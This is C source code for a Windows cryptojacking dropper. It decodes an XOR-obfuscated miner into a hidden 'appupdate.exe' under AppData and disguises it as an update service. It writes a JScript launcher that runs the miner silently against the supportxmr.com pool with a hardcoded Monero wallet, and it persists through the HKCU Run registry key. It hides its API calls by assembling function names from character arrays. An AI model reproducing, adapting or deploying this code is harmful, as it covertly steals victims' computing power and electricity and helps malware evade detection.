#include <intrin.h>
#include <Windows.h>
#include "xor_array.h"

BOOL SetAutorun(LPWSTR lpPath, LPCWSTR lpAutorunName, LPCWSTR lpMinerName);

BOOL aes() // return true if supported
{
	int CPUInfo[4];
	__cpuid(CPUInfo, 1);
	return (CPUInfo[2] & (1 << 25)) != 0;
}

BOOL GetAppData(LPWSTR lpBuffer, DWORD dwSize)
{
	WCHAR szAppData[] = { L'A', L'p', L'p', L'D', L'a', L't', L'a', L'\0' };
	DWORD dwRet = GetEnvironmentVariableW(szAppData, lpBuffer, dwSize);
	return ((dwRet > 0) && (dwRet <= dwSize));
}

BOOL CreateSubdir(LPWSTR lpPath, LPCWSTR lpDirName)
{
	typedef BOOL(WINAPI *fnCreateDirectory)(
		_In_     LPWSTR               lpPathName,
		_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes
		);

	CHAR szCreateDirectory[] = { 'C', 'r', 'e', 'a', 't', 'e', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'W', '\0' };
	WCHAR szKernelLib[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };

	fnCreateDirectory fpCreateDirectory = (fnCreateDirectory)GetProcAddress(GetModuleHandleW(szKernelLib), szCreateDirectory);

	if (!fpCreateDirectory)
		return FALSE;

	LPWSTR lpNewPath = (LPWSTR)VirtualAlloc(0, 512, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!lpNewPath)
		return FALSE;

	wsprintfW(lpNewPath, L"%s\\%s", lpPath, lpDirName);

	BOOL bRet = fpCreateDirectory(lpNewPath, 0);

	if (GetLastError() == ERROR_ALREADY_EXISTS)
		bRet = TRUE;

	VirtualFree(lpNewPath, 0, MEM_RELEASE);
	return bRet;

}

HANDLE MyCreateFileW(LPWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwCreationDisposition)
{
	typedef HANDLE(WINAPI *fnCreateFileW)(
		_In_     LPWSTR                lpFileName,
		_In_     DWORD                 dwDesiredAccess,
		_In_     DWORD                 dwShareMode,
		_In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		_In_     DWORD                 dwCreationDisposition,
		_In_     DWORD                 dwFlagsAndAttributes,
		_In_opt_ HANDLE                hTemplateFile
		);

	WCHAR szKernelLib[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	CHAR szCreateFileW[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', '\0' };


	fnCreateFileW fpCreateFileW = (fnCreateFileW)GetProcAddress(GetModuleHandleW(szKernelLib), szCreateFileW);

	if (!fpCreateFileW)
		return FALSE;

	return fpCreateFileW(lpFileName, dwDesiredAccess, FILE_SHARE_READ, 0, dwCreationDisposition, FILE_ATTRIBUTE_HIDDEN, 0);

}

BOOL MyWriteFile(HANDLE hFile, LPBYTE lpByteCode, DWORD dwSize)
{
	typedef BOOL(WINAPI *fnWriteFile)(
		_In_        HANDLE       hFile,
		_In_        LPVOID       lpBuffer,
		_In_        DWORD        nNumberOfBytesToWrite,
		_Out_opt_   LPDWORD      lpNumberOfBytesWritten,
		_Inout_opt_ LPOVERLAPPED lpOverlapped
		);

	WCHAR szKernelLib[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	CHAR szWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', '\0' };

	fnWriteFile fpWriteFile = (fnWriteFile)GetProcAddress(GetModuleHandleW(szKernelLib), szWriteFile);


	if (!fpWriteFile)
		return FALSE;

	DWORD dwWritten;
	return fpWriteFile(hFile, lpByteCode, dwSize, &dwWritten, 0);
}

BOOL DropArray(LPWSTR lpPath, LPCWSTR lpName, LPBYTE lpByteCode, DWORD dwSize)
{
	LPWSTR lpNewName = (LPWSTR)VirtualAlloc(0, 512, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpName)
		return FALSE;

	wsprintfW(lpNewName, L"%s\\%s", lpPath, lpName);

	BOOL bRet = FALSE;
	HANDLE hFile = MyCreateFileW(lpNewName, GENERIC_WRITE, CREATE_ALWAYS);
	//by hexf0x start
	unsigned char* orig_array = (unsigned char*)malloc(sizeof(char));
	size_t size = sizeof(x_array);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		for (int i = 0; i < size; i++)
		{
			orig_array[0] = x_array[i] ^ 0x5;
			bRet = MyWriteFile(hFile, orig_array, dwSize);
		}
		CloseHandle(hFile);
	}
	free(orig_array);
	//by hexf0x end
	VirtualFree(lpNewName, 0, MEM_RELEASE);
	return bRet;
}

unsigned char lpMinerAes[] = { 0, 0 };
unsigned char lpMinerNoAes[] = { 0, 0 };


BOOL DropMiner(BOOL bAes)
{
	LPWSTR lpPath = (LPWSTR)VirtualAlloc(0, 512, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!lpPath)
		return FALSE;

	BOOL bRet = FALSE;

	if (GetAppData(lpPath, 256))
	{
		if (CreateSubdir(lpPath, L"AppUpdate"))
		{
			lstrcatW(lpPath, L"\\AppUpdate");

			if (DropArray(lpPath, L"appupdate.exe", ((bAes == TRUE) ? lpMinerAes : lpMinerNoAes), 1))
			{
				bRet = SetAutorun(lpPath, L"updater.js", L"appupdate.exe");
			}

		}
	}

	VirtualFree(lpPath, 0, MEM_RELEASE);
	return bRet;
}

/////////////////

VOID MakeCorrection(LPWSTR out, LPWSTR in)
{
	DWORD OutCounter = 0;
	for (DWORD inCounter = 0; inCounter < lstrlenW(in); inCounter++)
	{
		if (in[inCounter] == L'\\')
		{
			for (DWORD inter = 0; inter < 2; inter++)
			{
				out[OutCounter++] = L'\\';
			}
		}
		else
		{
			out[OutCounter++] = in[inCounter];
		}
	}
	out[OutCounter] = L'\0';
}

BOOL WriteJsInFile(LPWSTR lpPath, LPCWSTR lpAutorunName, LPCWSTR lpFileName)
{

	struct jsCorrect
	{
		WCHAR jsCorrectPath[256];
		WCHAR lpNewName[256];
		WCHAR jscriptData[1024];
	};

	struct jsCorrect* lpjsc = (struct jsCorrect*)VirtualAlloc(0, sizeof(struct jsCorrect),
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!lpjsc)
		return FALSE;


	BOOL bRet = FALSE;

	wsprintfW(lpjsc->lpNewName, L"%s\\%s", lpPath, lpAutorunName);

	HANDLE hFile = MyCreateFileW(lpjsc->lpNewName, GENERIC_WRITE,
		CREATE_ALWAYS);

	if (hFile != INVALID_HANDLE_VALUE)
	{

		MakeCorrection(lpjsc->jsCorrectPath, lpPath);

		wsprintfW(lpjsc->jscriptData,
			L"var WSHShell = WScript.CreateObject(\"WScript.Shell\");WSHShell.Run('\"%s\\\\%s\" %s', 0);",
			lpjsc->jsCorrectPath,
			lpFileName,
			L"-t 1 -a cryptonight -o stratum+tcp://pool.supportxmr.com:7777 -u 49kUiyrnn326HA6xczikUCG1oevnPJhLeBRqiFWXjPbcWan4fC1149whFqt6XR8jdCLirGviET48KGKheXwrFEyfH751FUN -p x"
		);

		bRet = MyWriteFile(hFile, (LPBYTE)lpjsc->jscriptData,
			lstrlenW(lpjsc->jscriptData) * 2);

		CloseHandle(hFile);

	}
	VirtualFree(lpjsc, 0, MEM_RELEASE);

	return bRet;
}

BOOL SetAutorun(LPWSTR lpPath, LPCWSTR lpAutorunName, LPCWSTR lpMinerName)
{
	BOOL bRet = FALSE;

	HKEY hKey;

	DWORD ret = RegCreateKeyExW(HKEY_CURRENT_USER,
		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, 0, 0, KEY_ALL_ACCESS, 0, &hKey, 0);
	if (ret == ERROR_SUCCESS)
	{
		if (WriteJsInFile(lpPath, lpAutorunName, lpMinerName))
		{
			LPWSTR lpAutorunPath = (LPWSTR)VirtualAlloc(0, 600, MEM_COMMIT |
				MEM_RESERVE, PAGE_READWRITE);

			if (lpAutorunPath)
			{
				wsprintfW(lpAutorunPath, L"wscript.exe \"%s\\%s\"", lpPath,
					lpAutorunName);
				ret = RegSetValueExW(hKey, L"AppUpdateService", 0, REG_SZ,
					(LPBYTE)lpAutorunPath, lstrlenW(lpAutorunPath) * 2);
				if (ret == ERROR_SUCCESS)
				{
					bRet = TRUE;
				}
				ShellExecuteW(0, L"open", lpAutorunPath, 0, 0, SW_SHOW);

				RegCloseKey(hKey);
				VirtualFree(lpAutorunPath, 0, MEM_RELEASE);
			}
		}
	}


	return bRet;
}

int main(int argc, char* agrv[])
{
	BOOL bAes = aes();
	DropMiner(bAes);
	return 0;
}

